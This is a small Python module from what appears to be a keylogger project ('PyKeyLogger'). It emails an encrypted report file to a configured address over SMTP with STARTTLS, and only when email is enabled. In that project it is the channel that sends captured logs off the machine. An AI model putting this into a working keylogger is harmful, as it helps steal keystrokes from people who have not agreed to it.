"""Optional SMTP delivery for encrypted audit reports."""

import smtplib
from email.message import EmailMessage
from pathlib import Path

from config import (
    EMAIL_ENABLED,
    EMAIL_FROM,
    EMAIL_TO,
    SMTP_HOST,
    SMTP_PASSWORD,
    SMTP_PORT,
    SMTP_USERNAME,
)


def send_report(path: Path) -> None:
    """Email an explicitly configured report attachment over STARTTLS."""
    if not EMAIL_ENABLED:
        return
    required = (SMTP_HOST, SMTP_USERNAME, SMTP_PASSWORD, EMAIL_FROM, EMAIL_TO)
    if not all(required):
        raise ValueError("SMTP configuration is incomplete; email was not sent.")
    message = EmailMessage()
    message["Subject"] = "PyKeyLogger educational audit report"
    message["From"] = EMAIL_FROM
    message["To"] = EMAIL_TO
    message.set_content("Attached is an encrypted educational audit report.")
    message.add_attachment(
        Path(path).read_bytes(),
        maintype="application",
        subtype="octet-stream",
        filename=Path(path).name,
    )
    with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=20) as server:
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(SMTP_USERNAME, SMTP_PASSWORD)
        server.send_message(message)
